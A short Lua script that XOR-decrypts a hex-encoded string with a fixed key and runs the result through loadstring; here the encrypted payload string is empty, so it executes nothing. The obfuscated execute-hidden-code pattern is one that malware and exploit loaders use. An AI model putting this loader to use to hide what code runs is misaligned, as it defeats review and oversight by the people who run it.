local k={63,113,43,151,220,56,194,206,167,56,243,56,12,199,149,164,49,56,191,217,183,42,83,73,137,75,53,25,80,177,67,211}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
